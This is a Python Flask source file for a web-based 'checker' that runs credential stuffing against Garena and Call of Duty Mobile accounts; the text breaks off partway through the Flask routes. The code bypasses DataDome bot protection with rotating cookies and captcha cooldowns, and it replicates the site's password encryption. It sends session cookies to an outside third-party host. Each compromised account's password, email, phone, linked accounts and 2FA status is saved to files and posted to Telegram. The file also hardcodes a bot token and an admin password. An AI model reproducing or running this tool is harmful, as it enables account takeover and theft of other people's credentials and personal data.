#--- START OF FILE app.py ---

# --- START OF FILE app.py ---

import os
import sys
import re
import time
import json
import uuid
import base64
import hashlib
import random
import logging
import urllib
import platform
import subprocess
import html
import threading
import queue
import traceback
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs, urlencode
from collections import OrderedDict

# --- Flask and Web App Imports ---
from flask import Flask, render_template, request, jsonify, redirect, url_for, send_from_directory, session, flash
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash

# --- CONFIGURATION (MODIFIED FOR VERCEL) ---
ADMIN_TELEGRAM_BOT_TOKEN = os.environ.get("ADMIN_TELEGRAM_BOT_TOKEN", "8075069522:AAE0lI5FgjWw7jebgzJR1JM1kBo2lgITtgI")
ADMIN_TELEGRAM_CHAT_ID = os.environ.get("ADMIN_TELEGRAM_CHAT_ID", "5163892491")
BASE_TMP_DIR = '/tmp'
DATA_DIR = os.path.join(BASE_TMP_DIR, 'garena_data')
UPLOAD_FOLDER = os.path.join(DATA_DIR, 'uploads')
RESULTS_BASE_DIR = os.path.join(DATA_DIR, 'results')
LOGS_BASE_DIR = os.path.join(DATA_DIR, 'logs')
APP_DATA_DIR = os.path.join(DATA_DIR, 'app_data')

USERS_FILE = os.path.join(DATA_DIR, 'users.json')
KEYS_FILE = os.path.join(DATA_DIR, 'keys.json')
ANNOUNCEMENTS_FILE = os.path.join(DATA_DIR, 'announcements.json')

# --- Necessary Packages ---
import requests
from tqdm import tqdm
from colorama import Fore, Style, init
from Crypto.Cipher import AES
# Import placeholder modules
import change_cookie
import ken_cookie
import cookie_config
import set_cookie

init(autoreset=True)

# --- Flask App Setup ---
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "you-must-set-a-very-secret-key")

for folder in [DATA_DIR, UPLOAD_FOLDER, RESULTS_BASE_DIR, LOGS_BASE_DIR, APP_DATA_DIR]:
    os.makedirs(folder, exist_ok=True)

# --- Per-User Session State Management for Concurrent Checks ---
user_check_sessions = {}
sessions_lock = threading.Lock()

def get_or_create_user_session(username):
    """Safely gets or creates a session state for a given user."""
    with sessions_lock:
        if username not in user_check_sessions:
            user_check_sessions[username] = {
                'status': {
                    'running': False, 'progress': 0, 'total': 0, 'logs': [], 'stats': {},
                    'final_summary': None, 'captcha_detected': False, 'stop_requested': False,
                    'current_account': '',
                },
                'status_lock': threading.Lock(),
                'stop_event': threading.Event(),
                'captcha_pause_event': threading.Event(),
                'thread': None
            }
        return user_check_sessions[username]

# --- Constants ---
apkrov = "https://auth.garena.com/api/login?"
redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
datenok = str(int(time.time()))
PROGRESS_STATE_FILE_TEMPLATE = os.path.join(APP_DATA_DIR, 'progress_state_{}.json') # Per-user progress

COUNTRY_KEYWORD_MAP = {
    "PH": ["PHILIPPINES", "PH"], "ID": ["INDONESIA", "ID"], "US": ["UNITED STATES", "USA", "US"],
    "ES": ["SPAIN", "ES"], "VN": ["VIETNAM", "VN"], "CN": ["CHINA", "CN"], "MY": ["MALAYSIA", "MY"],
    "TW": ["TAIWAN", "TW"], "TH": ["THAILAND", "TH"], "RU": ["RUSSIA", "RUSSIAN FEDERATION", "RU"],
    "PT": ["PORTUGAL", "PT"],
}

# --- User and Key Management ---
def load_data(file_path):
    if not os.path.exists(file_path): return []
    try:
        with open(file_path, 'r') as f: return json.load(f)
    except (json.JSONDecodeError, IOError): return []

def save_data(data, file_path):
    try:
        with open(file_path, 'w') as f: json.dump(data, f, indent=4)
    except IOError as e:
        print(f"Error saving data to {file_path}: {e}") # Log to server console

def init_admin_user():
    users = load_data(USERS_FILE)
    if not any(u['username'] == 'admin' for u in users):
        admin_user = {
            "username": "admin",
            "password_hash": generate_password_hash("kenzen03"),
            "email": "admin@checker.local",
            "upgrade_expires_at": (datetime.now() + timedelta(days=365*10)).isoformat(), # Permanent admin
            "registered_at": datetime.now().isoformat()
        }
        users.append(admin_user)
        save_data(users, USERS_FILE)
        print("Admin user created.")

init_admin_user()

def is_user_upgraded(user_data):
    if not user_data: return False
    expires_at_str = user_data.get("upgrade_expires_at")
    if not expires_at_str: return False
    try:
        return datetime.fromisoformat(expires_at_str) > datetime.now()
    except (ValueError, TypeError): return False

# --- Helper Functions (Checker Logic) ---
def log_message(user_session, message, color_class='text-white'):
    if not user_session: return
    clean_message = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]').sub('', message)
    timestamp = datetime.now().strftime('%H:%M:%S')
    with user_session['status_lock']:
        status = user_session['status']
        status['logs'].append({'timestamp': timestamp, 'message': clean_message, 'class': color_class})
        if len(status['logs']) > 500: status['logs'].pop(0)

def get_app_data_directory(): return APP_DATA_DIR
def get_logs_directory(): return LOGS_BASE_DIR
def get_results_directory(): return RESULTS_BASE_DIR

def save_telegram_config(user_session, token, chat_id):
    config_path = os.path.join(get_app_data_directory(), "telegram_config.json")
    config = {'bot_token': token, 'chat_id': chat_id}
    try:
        with open(config_path, 'w') as f: json.dump(config, f, indent=4)
        log_message(user_session, "[💾] Telegram credentials saved successfully (for this session only).", "text-success")
    except IOError as e: log_message(user_session, f"Error saving Telegram config: {e}", "text-danger")

def load_telegram_config():
    config_path = os.path.join(get_app_data_directory(), "telegram_config.json")
    if not os.path.exists(config_path): return None, None
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
            return config.get('bot_token'), config.get('chat_id')
    except (json.JSONDecodeError, IOError): return None, None

def strip_ansi_codes_jarell(text):
    return re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]').sub('', text)

def generate_md5_hash(password):
    md5_hash = hashlib.md5(); md5_hash.update(password.encode('utf-8')); return md5_hash.hexdigest()

def generate_decryption_key(password_md5, v1, v2):
    intermediate_hash = hashlib.sha256((password_md5 + v1).encode()).hexdigest()
    return hashlib.sha256((intermediate_hash + v2).encode()).hexdigest()

def encrypt_aes_256_ecb(plaintext, key):
    cipher = AES.new(bytes.fromhex(key), AES.MODE_ECB)
    plaintext_bytes = bytes.fromhex(plaintext)
    padding_length = 16 - len(plaintext_bytes) % 16
    plaintext_bytes += bytes([padding_length]) * padding_length
    chiper_raw = cipher.encrypt(plaintext_bytes)
    return chiper_raw.hex()[:32]

def getpass(password, v1, v2):
    password_md5 = generate_md5_hash(password)
    decryption_key = generate_decryption_key(password_md5, v1, v2)
    return encrypt_aes_256_ecb(password_md5, decryption_key)

def get_datadome_cookie(user_session):
    url = 'https://dd.garena.com/js/'
    headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br, zstd','accept-language': 'en-US,en;q=0.9','cache-control': 'no-cache','content-type': 'application/x-www-form-urlencoded','origin': 'https://account.garena.com','pragma': 'no-cache','referer': 'https://account.garena.com/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'}
    js_data_dict = {"ttst": 76.7, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", "wbd": False, "lg": "en-US", "plg": 5, "plgne": True, "vnd": "Google Inc."}
    payload = {'jsData': json.dumps(js_data_dict), 'eventCounters' : '[]', 'jsType': 'ch', 'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae', 'ddk': 'AE3F04AD3F0D3A462481A337485081', 'Referer': 'https://account.garena.com/', 'request': '/', 'responsePage': 'origin', 'ddv': '4.35.4'}
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            log_message(user_session, "[🍪] Successfully fetched a new DataDome cookie from server.", "text-success")
            return cookie_string.split(';')[0].split('=')[1]
        return None
    except requests.exceptions.RequestException: return None

def fetch_new_datadome_pool(user_session, num_cookies=5):
    log_message(user_session, f"[⚙️] Attempting to fetch {num_cookies} new DataDome cookies...", "text-info")
    new_pool = []
    for _ in range(num_cookies):
        new_cookie = get_datadome_cookie(user_session)
        if new_cookie and new_cookie not in new_pool:
            new_pool.append(new_cookie)
        log_message(user_session, f"Fetching cookies... ({len(new_pool)}/{num_cookies})", "text-info")
        time.sleep(random.uniform(0.5, 1.5))
    if new_pool:
        log_message(user_session, f"[✅] Successfully fetched {len(new_pool)} new unique cookies.", "text-success")
    else:
        log_message(user_session, f"[❌] Failed to fetch any new cookies. Your IP might be heavily restricted.", "text-danger")
    return new_pool

def save_successful_token(user_session, token):
    if not token: return
    file_path = os.path.join(get_app_data_directory(), "token_sessions.json")
    token_pool = load_data(file_path) if isinstance(load_data(file_path), list) else []
    if token not in token_pool:
        token_pool.append(token)
        save_data(token_pool, file_path)
        log_message(user_session, "[💾] New Token Session saved to pool.", "text-success")

def save_datadome_cookie(user_session, cookie_value):
    if not cookie_value: return
    file_path = os.path.join(get_app_data_directory(), "datadome_cookies.json")
    cookie_pool = load_data(file_path) if isinstance(load_data(file_path), list) else []
    if not any(c.get('datadome') == cookie_value for c in cookie_pool):
        cookie_pool.append({'datadome': cookie_value})
        save_data(cookie_pool, file_path)
        log_message(user_session, "[💾] New DataDome Cookie saved to pool.", "text-info")

def check_login(user_session, account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date, selected_cookie_module):
    cookies["datadome"] = dataa
    login_params = {'app_id': '100082', 'account': account_username, 'password': encryptedpassword, 'redirect_uri': redrov, 'format': 'json', 'id': _id}
    login_url = apkrov + urlencode(login_params)
    try:
        response = requests.get(login_url, headers=selected_header, cookies=cookies, timeout=60)
        response.raise_for_status()
        login_json_response = response.json()
    except requests.exceptions.RequestException as e: return f"[⚠️] Request Error: {e}"
    except json.JSONDecodeError: return f"[💢] Invalid JSON: {response.text[:100]}"
    if 'error_auth' in login_json_response or 'error' in login_json_response: return "[🔐] ɪɴᴄᴏʀʀᴇᴄᴛ ᴘᴀssᴡᴏʀᴅ"
    session_key = login_json_response.get('session_key')
    if not session_key: return "[FAILED] No session key found after login"
    log_message(user_session, "[🔑] Successfully obtained session_key.", "text-success")
    successful_token = response.cookies.get('token_session')
    if successful_token: save_successful_token(user_session, successful_token)
    set_cookie_header = response.headers.get('Set-Cookie', '')
    sso_key = set_cookie_header.split('=')[1].split(';')[0] if '=' in set_cookie_header else ''
    coke = selected_cookie_module.get_cookies()
    coke["datadome"] = dataa
    coke["sso_key"] = sso_key
    if successful_token: coke["token_session"] = successful_token
    hider = {'Host': 'account.garena.com', 'Connection': 'keep-alive', 'User-Agent': selected_header["User-Agent"], 'Accept': 'application/json, text/plain, */*', 'Referer': f'https://account.garena.com/?session_key={session_key}'}
    init_url = 'http://gakumakupal.x10.bz/patal.php'
    params = {f'coke_{k}': v for k, v in coke.items()}
    params.update({f'hider_{k}': v for k, v in hider.items()})
    try:
        init_response = requests.get(init_url, params=params, timeout=120)
        init_response.raise_for_status()
        init_json_response = init_response.json()
    except (requests.RequestException, json.JSONDecodeError) as e: return f"[ERROR] Bind check failed: {e}"
    if 'error' in init_json_response or not init_json_response.get('success', True): return f"[ERROR] {init_json_response.get('error', 'Unknown error during bind check')}"
    bindings = init_json_response.get('bindings', [])
    is_clean = init_json_response.get('status') == "\033[0;32m\033[1mClean\033[0m"
    country, last_login, fb, mobile, facebook = "N/A", "N/A", "N/A", "N/A", "False"
    shell, email, email_verified, authenticator_enabled, two_step_enabled = "0", "N/A", "False", "False", "False"
    for item in bindings:
        try:
            key, value = item.split(":", 1)
            value = value.strip()
            if key == "Country": country = value
            elif key == "LastLogin": last_login = value
            elif key == "Garena Shells": shell = value
            elif key == "Facebook Account": fb, facebook = value, "True"
            elif key == "Mobile Number": mobile = value
            elif key == "tae": email_verified = "True"
            elif key == "eta": email = value
            elif key == "Authenticator": authenticator_enabled = "True"
            elif key == "Two-Step Verification": two_step_enabled = "True"
        except ValueError: continue
    save_datadome_cookie(user_session, dataa)
    head = {"Host": "auth.garena.com", "Accept": "application/json, text/plain, */*", "User-Agent": selected_header["User-Agent"], "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "Origin": "https://auth.garena.com", "Referer": "https://auth.garena.com/"}
    data_payload = {"client_id": "100082", "response_type": "token", "redirect_uri": redrov, "format": "json", "id": _id}
    try:
        grant_url = "https://auth.garena.com/oauth/token/grant"
        reso = requests.post(grant_url, headers=head, data=data_payload, cookies=coke)
        reso.raise_for_status()
        data = reso.json()
        if "access_token" in data:
            log_message(user_session, "[🔑] Successfully obtained access_token. Fetching game details...", "text-success")
            game_info = show_level(user_session, data["access_token"], selected_header, sso_key, successful_token, get_datadome_cookie(user_session), coke)
            codm_level = 'N/A'
            if "[FAILED]" in game_info:
                connected_games = ["No CODM account found or error fetching data."]
            else:
                codm_nickname, codm_level, codm_region, uid = game_info.split("|")
                connected_games = [f"  Nickname: {codm_nickname}\n  Level: {codm_level}\n  Region: {codm_region}\n  UID: {uid}"] if uid and uid != 'N/A' else ["No CODM account found"]
            return format_result(last_login, country, shell, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, email, date, account_username, password, codm_level)
        else: return f"[FAILED] 'access_token' not found in grant response."
    except (requests.RequestException, json.JSONDecodeError) as e: return f"[FAILED] Token grant failed: {e}"

def show_level(user_session, access_token, selected_header, sso, token, newdate, cookie):
    url = "https://auth.codm.garena.com/auth/auth/callback_n"
    params = {"site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": access_token}
    headers = {"Referer": "https://auth.garena.com/", "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")}
    cookie.update({"datadome": newdate, "sso_key": sso, "token_session": token})
    try:
        res = requests.get(url, headers=headers, cookies=cookie, params=params, timeout=30, allow_redirects=True)
        res.raise_for_status()
        parsed_url = urlparse(res.url)
        extracted_token = parse_qs(parsed_url.query).get("token", [None])[0]
        if not extracted_token: return "[FAILED] No token extracted from redirected URL."
        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
        check_login_headers = {"codm-delete-token": extracted_token, "Origin": "https://delete-request.codm.garena.co.id", "Referer": "https://delete-request.codm.garena.co.id/", "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")}
        check_login_response = requests.get(check_login_url, headers=check_login_headers, timeout=30)
        check_login_response.raise_for_status()
        data = check_login_response.json()
        if data and "user" in data:
            user = data["user"]
            return f"{user.get('codm_nickname', 'N/A')}|{user.get('codm_level', 'N/A')}|{user.get('region', 'N/A')}|{user.get('uid', 'N/A')}"
        else: return "[FAILED] NO CODM ACCOUNT!"
    except (requests.RequestException, json.JSONDecodeError, KeyError, IndexError) as e: return f"[FAILED] CODM data fetch error: {e}"

def format_result(last_login, country, shell, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, email, date, username, password, codm_level):
    is_clean_text = "Clean ✔" if is_clean else "Not Clean ⚠️"
    email_ver_text = "(Verified✔)" if email_verified == "True" else "(Not Verified⚠️)"
    bool_status_text = lambda status_str: "True ✔" if status_str == 'True' else "False ❌"
    has_codm = "No CODM account found" not in connected_games[0]
    console_message = f"""[✅] GARENA ACCOUNT HIT
   [🔑 Credentials]
      User: {username} | Pass: {password}
   [📊 Information]
      Country: {country} | Shells: {shell} 💰 | Last Login: {last_login}
      Email: {email} {email_ver_text} | Facebook: {fb}
   [🎮 CODM Details]
      {connected_games[0].replace(chr(10), chr(10) + "      ")}
   [🛡️ Security]
      Status: {is_clean_text} | Mobile Bind: {bool_status_text('True' if mobile != 'N/A' else 'False')}
      Facebook Link: {bool_status_text(facebook)} | 2FA Enabled: {bool_status_text(two_step_enabled)}
      Authenticator: {bool_status_text(authenticator_enabled)}
      - Presented By: @KenshiKupal -""".strip()
    codm_level_num = int(codm_level) if isinstance(codm_level, str) and codm_level.isdigit() else 0
    telegram_message = None
    if has_codm:
        s_user, s_pass, s_country = html.escape(username), html.escape(password), html.escape(country)
        s_email, s_fb, s_last_login = html.escape(email), html.escape(fb), html.escape(last_login)
        tg_clean_status, tg_email_ver = ("Clean ✔", "(Verified✔)") if is_clean else ("Not Clean ⚠️", "(Not Verified⚠️)")
        tg_codm_info = "\n".join([f"  <code>{html.escape(line.strip())}</code>" for line in connected_games[0].strip().split('\n')])
        tg_title = "✅ <b>GARENA ACCOUNT HIT | LEVEL 100+</b> ✅" if codm_level_num >= 100 else "✅ <b>GARENA ACCOUNT HIT</b> ✅"
        telegram_message = f"""{tg_title}
- - - - - - - - - - - - - - - - -
🔑  <b><u>Credentials:</u></b>
  <b>User:</b> <code>{s_user}</code>
  <b>Pass:</b> <code>{s_pass}</code>
- - - - - - - - - - - - - - - - -
📊  <b><u>Account Info:</u></b>
  <b>Country:</b> {s_country} | <b>Shells:</b> {shell} 💰
  <b>Last Login:</b> {s_last_login}
  <b>Email:</b> <code>{s_email}</code> {tg_email_ver}
  <b>Facebook:</b> <code>{s_fb}</code>
- - - - - - - - - - - - - - - - -
🎮  <b><u>CODM Details:</u></b>
{tg_codm_info}
- - - - - - - - - - - - - - - - -
🛡️  <b><u>Security Status:</u></b>
  <b>Account Status:</b> {tg_clean_status}
  <b>Mobile Bind:</b> {'True ✔' if mobile != 'N/A' else 'False ❌'}
  <b>Facebook Link:</b> {'True ✔' if facebook == 'True' else 'False ❌'}
  <b>2FA Enabled:</b> {'True ✔' if two_step_enabled == 'True' else 'False ❌'}
  <b>Authenticator:</b> {'True ✔' if authenticator_enabled == 'True' else 'False ❌'}
- - - - - - - - - - - - - - - - -
<i>Presented By: @KenshiKupal</i>""".strip()
    country_folder = "Others"
    for folder_key, keywords in COUNTRY_KEYWORD_MAP.items():
        if any(keyword in str(country).upper() for keyword in keywords):
            country_folder = folder_key
            break
    level_range = "No_CODM_Data"
    if has_codm:
        if 1 <= codm_level_num <= 50: level_range = "1-50"
        elif 51 <= codm_level_num <= 100: level_range = "51-100"
        elif 101 <= codm_level_num <= 200: level_range = "101-200"
        elif 201 <= codm_level_num <= 300: level_range = "201-300"
        elif 301 <= codm_level_num <= 400: level_range = "301-400"
    clean_tag = "clean" if is_clean else "not_clean"
    country_path = os.path.join(get_results_directory(), country_folder)
    file_to_write = os.path.join(country_path, f"{level_range}_{clean_tag}.txt")
    content_to_write = console_message + "\n" + "=" * 60 + "\n"
    return (console_message, telegram_message, codm_level_num, country, username, password, shell, has_codm, is_clean, file_to_write, content_to_write)

def get_request_data(selected_cookie_module):
    cookies = selected_cookie_module.get_cookies()
    headers = {'Host': 'auth.garena.com', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36', 'Referer': 'https://auth.garena.com/'}
    return cookies, headers

def check_account(user_session, username, password, date, datadome_cookie, selected_cookie_module):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            random_id = "17290585" + str(random.randint(10000, 99999))
            cookies, headers = get_request_data(selected_cookie_module)
            if datadome_cookie: cookies['datadome'] = datadome_cookie
            params = {"app_id": "100082", "account": username, "format": "json", "id": random_id}
            response = requests.get("https://auth.garena.com/api/prelogin", params=params, cookies=cookies, headers=headers, timeout=20)
            if "captcha" in response.text.lower(): return "[CAPTCHA]"
            if response.status_code == 200:
                data = response.json()
                if not all(k in data for k in ['v1', 'v2', 'id']): return "[😢] 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗜𝗗𝗡'𝗧 𝗘𝗫𝗜𝗦𝗧"
                login_datadome = response.cookies.get('datadome') or datadome_cookie
                if "error" in data: return f"[FAILED] Pre-login error: {data['error']}"
                encrypted_password = getpass(password, data['v1'], data['v2'])
                return check_login(user_session, username, random_id, encrypted_password, password, headers, cookies, login_datadome, date, selected_cookie_module)
            else: return f"[FAILED] HTTP Status: {response.status_code}"
        except requests.exceptions.RequestException as e:
            error_str = str(e).lower()
            if "failed to establish a new connection" in error_str or "max retries exceeded" in error_str or "network is unreachable" in error_str:
                log_message(user_session, f"[⚠️] Connection error for {username}. Retrying ({attempt + 1}/{max_retries})...", "text-warning")
                if attempt < max_retries - 1: time.sleep(5); continue
                else: return f"[FAILED] Connection failed after {max_retries} retries."
            else: return f"[FAILED] Unexpected Request Error: {e}"
        except Exception as e: return f"[FAILED] Unexpected Error: {e}"

def send_to_telegram(bot_token, chat_id, message):
    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML', 'disable_web_page_preview': True}
    try:
        response = requests.post(api_url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception: return False

def remove_duplicates_from_file(user_session, file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f: lines = f.read().splitlines()
        initial_count = len(lines)
        unique_lines = list(OrderedDict.fromkeys(line for line in lines if line.strip()))
        final_count = len(unique_lines)
        removed_count = initial_count - final_count
        if removed_count > 0:
            with open(file_path, 'w', encoding='utf-8') as f: f.write('\n'.join(unique_lines))
            log_message(user_session, f"[✨] Removed {removed_count} duplicate/empty line(s) from '{os.path.basename(file_path)}'.", "text-info")
        return unique_lines, final_count
    except FileNotFoundError:
        log_message(user_session, f"Error: File not found at '{file_path}'.", "text-danger")
        return [], 0
    except Exception as e:
        log_message(user_session, f"Error processing file for duplicates: {e}", "text-danger")
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line for line in f.read().splitlines() if line.strip()]
        return lines, len(lines)

def save_progress(username, file_path, index):
    progress_file = PROGRESS_STATE_FILE_TEMPLATE.format(hashlib.md5(username.encode()).hexdigest())
    try:
        with open(progress_file, 'w') as f: json.dump({'source_file_path': file_path, 'last_processed_index': index}, f)
    except IOError: pass

def load_progress(username):
    progress_file = PROGRESS_STATE_FILE_TEMPLATE.format(hashlib.md5(username.encode()).hexdigest())
    if not os.path.exists(progress_file): return None
    try:
        with open(progress_file, 'r') as f: return json.load(f)
    except (IOError, json.JSONDecodeError): return None

def clear_progress(username):
    progress_file = PROGRESS_STATE_FILE_TEMPLATE.format(hashlib.md5(username.encode()).hexdigest())
    if os.path.exists(progress_file): os.remove(progress_file)

def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_cookie_module_name, use_cookie_set, auto_delete, force_restart, telegram_level_filter, fixed_cookie_number, user_info, user_session):
    log_message(user_session, "[⚠️ VERCEL NOTE] Checker is running on a serverless platform. Task will be terminated after the timeout limit.", "text-warning")

    status_lock = user_session['status_lock']
    stop_event = user_session['stop_event']
    captcha_pause_event = user_session['captcha_pause_event']
    check_status = user_session['status']
    username = user_info['username']

    is_complete = False
    try:
        if force_restart:
            clear_progress(username)
            log_message(user_session, "[🔄] Forced restart. Previous progress has been cleared.", "text-info")
        start_from_index = 0
        progress_data = load_progress(username)
        if progress_data and progress_data.get('source_file_path') == file_path:
            start_from_index = progress_data.get('last_processed_index', -1) + 1
            if start_from_index > 0: log_message(user_session, f"[🔄] Resuming session from line {start_from_index + 1}.", "text-info")
        
        selected_cookie_module = getattr(sys.modules[__name__], selected_cookie_module_name)
        if selected_cookie_module_name == 'set_cookie' and fixed_cookie_number > 0:
            set_cookie.set_fixed_number(fixed_cookie_number)
            log_message(user_session, f"[⚙️] Numbered Set is locked to use ONLY cookie #{fixed_cookie_number}.", "text-info")

        stats = { 'successful': 0, 'failed': 0, 'clean': 0, 'not_clean': 0, 'incorrect_pass': 0, 'no_exist': 0, 'other_fail': 0, 'telegram_sent': 0, 'captcha_count': 0 }
        failed_file = os.path.join(get_logs_directory(), f"failed_{username}_{datenok}.txt")
        accounts, total_accounts = remove_duplicates_from_file(user_session, file_path)
        
        if user_info and not is_user_upgraded(user_info) and total_accounts > 100:
            log_message(user_session, f"[⚠️] Free account limit reached. Processing only the first 100 lines out of {total_accounts}.", "text-warning")
            accounts, total_accounts = accounts[:100], 100

        accounts_to_process = accounts[start_from_index:]
        with status_lock: check_status.update({'total': total_accounts, 'progress': start_from_index, 'stats': stats})

        cookie_state = {'pool': [], 'index': -1, 'cooldown': {}}
        if use_cookie_set:
            cookie_state['pool'] = [c.get('datadome') for c in cookie_config.COOKIE_POOL if c.get('datadome')]
            log_message(user_session, f"[🍪] Loaded {len(cookie_state['pool'])} hardcoded DataDome cookies.", "text-info")
        else:
            cookie_file = os.path.join(get_app_data_directory(), "datadome_cookies.json")
            if os.path.exists(cookie_file):
                loaded_cookies = load_data(cookie_file)
                if isinstance(loaded_cookies, list): cookie_state['pool'] = [c.get('datadome') for c in loaded_cookies if 'datadome' in c]
                log_message(user_session, f"[🍪] Loaded {len(cookie_state['pool'])} DataDome cookies from local pool.", "text-info")

        if not cookie_state['pool']:
            log_message(user_session, "[⚠️] DataDome cookie pool is empty. Fetching new ones...", "text-warning")
            cookie_state['pool'] = fetch_new_datadome_pool(user_session)
            if not cookie_state['pool']:
                log_message(user_session, "[❌] Failed to get any DataDome cookies. Stopping.", "text-danger")
                stop_event.set()

        for loop_idx, acc in enumerate(accounts_to_process):
            original_index = start_from_index + loop_idx
            if stop_event.is_set(): log_message(user_session, "Checker stopped by user.", "text-warning"); break
            with status_lock: check_status.update({'progress': original_index, 'current_account': acc})
            
            if ':' in acc:
                username_acc, password = acc.split(':', 1)
                is_captcha_loop = True
                while is_captcha_loop and not stop_event.is_set():
                    current_datadome = None
                    if not cookie_state['pool']: 
                        log_message(user_session, "[❌] No cookies available in the pool. Stopping check.", "text-danger")
                        stop_event.set()
                        break
                    
                    for _ in range(len(cookie_state['pool'])):
                        cookie_state['index'] = (cookie_state['index'] + 1) % len(cookie_state['pool'])
                        potential_cookie = cookie_state['pool'][cookie_state['index']]
                        
                        cooldown_until = cookie_state['cooldown'].get(potential_cookie)
                        if cooldown_until and time.time() < cooldown_until:
                            continue 
                        current_datadome = potential_cookie
                        break

                    if not current_datadome: 
                        log_message(user_session, "[❌] All available cookies are on cooldown. Please wait or add new cookies.", "text-danger")
                        stop_event.set()
                        break

                    log_message(user_session, f"[▶] Checking: {username_acc}:{password} with cookie ...{current_datadome[-6:]}", "text-info")
                    result = check_account(user_session, username_acc, password, datenok, current_datadome, selected_cookie_module)

                    if result == "[CAPTCHA]":
                        stats['captcha_count'] += 1
                        log_message(user_session, f"[🔴 CAPTCHA] Triggered by cookie ...{current_datadome[-6:]}", "text-danger")
                        
                        expiry_time = time.time() + 300
                        cookie_state['cooldown'][current_datadome] = expiry_time
                        log_message(user_session, f"[⏳] Cookie placed on cooldown for 5 minutes.", "text-warning")

                        with status_lock: check_status['captcha_detected'] = True
                        time.sleep(random.uniform(2, 4))
                        
                        captcha_pause_event.clear()
                        captcha_pause_event.wait(timeout=30) # Add timeout for serverless env
                        
                        with status_lock: check_status['captcha_detected'] = False
                        
                        if stop_event.is_set(): break
                        log_message(user_session, "[🔄] Resuming check for the same account...", "text-info")
                        continue
                    else:
                        is_captcha_loop = False

                if stop_event.is_set(): break
                
                if isinstance(result, tuple):
                    console_message, telegram_message, codm_level_num, _, user_res, _, _, _, is_clean, file_to_write, content_to_write = result
                    log_message(user_session, console_message, "text-success")
                    stats['successful'] += 1; stats['clean' if is_clean else 'not_clean'] += 1
                    os.makedirs(os.path.dirname(file_to_write), exist_ok=True)
                    with open(file_to_write, "a", encoding="utf-8") as f: f.write(content_to_write)
                    if telegram_message and telegram_bot_token and telegram_chat_id and telegram_level_filter != 'none':
                        send_notification = (telegram_level_filter == 'all') or (telegram_level_filter == '100+' and codm_level_num >= 100)
                        if send_notification:
                            if send_to_telegram(telegram_bot_token, telegram_chat_id, telegram_message):
                                log_message(user_session, f"[✅ TG] Notification sent for {user_res}.", "text-info"); stats['telegram_sent'] += 1
                            else: log_message(user_session, f"[❌ TG] Failed to send notification for {user_res}.", "text-danger")
                elif result:
                    stats['failed'] += 1
                    if "[🔐]" in result: stats['incorrect_pass'] += 1
                    elif "[😢]" in result: stats['no_exist'] += 1
                    else: stats['other_fail'] += 1
                    with open(failed_file, 'a', encoding='utf-8') as failed_out: failed_out.write(f"{username_acc}:{password} - {result}\n")
                    log_message(user_session, f"User: {username_acc} | Pass: {password} ➔ {result}", "text-danger")
            else: log_message(user_session, f"Invalid format: {acc} ➔ Skipping", "text-warning")
            
            with status_lock: check_status['stats'] = stats.copy()
            save_progress(username, file_path, original_index)
        
        if not stop_event.is_set():
            is_complete = True
            with status_lock:
                check_status['progress'] = total_accounts
                summary = ["--- CHECKING COMPLETE ---", f"Total: {total_accounts} | Success: {stats['successful']} | Failed: {stats['failed']}", "[VERCEL NOTE] All saved files are temporary and will be deleted."]
                check_status['final_summary'] = "\n".join(summary)
            log_message(user_session, "--- CHECKING COMPLETE ---", "text-success")
    except Exception as e:
        log_message(user_session, f"An unexpected error occurred in the checker task: {e}", "text-danger")
        log_message(user_session, traceback.format_exc(), "text-danger")
    finally:
        if is_complete:
            clear_progress(username)
            if auto_delete:
                try:
                    os.remove(file_path)
                    log_message(user_session, f"Source file '{os.path.basename(file_path)}' has been deleted from temporary storage.", "text-info")
                except OSError as e: log_message(user_session, f"Failed to delete source file: {e}", "text-danger")
        with status_lock: check_status['running'] = False


# --- Flask Routes ---

@app.context_processor
def inject_user_status():
    if 'user' in session:
        return dict(is_upgraded=is_user_upgraded(session['user']))
    return dict(is_upgraded=False)

@app.route('/')
def index():
    if 'user' not in session: return redirect(url_for('login'))
    users = load_data(USERS_FILE)
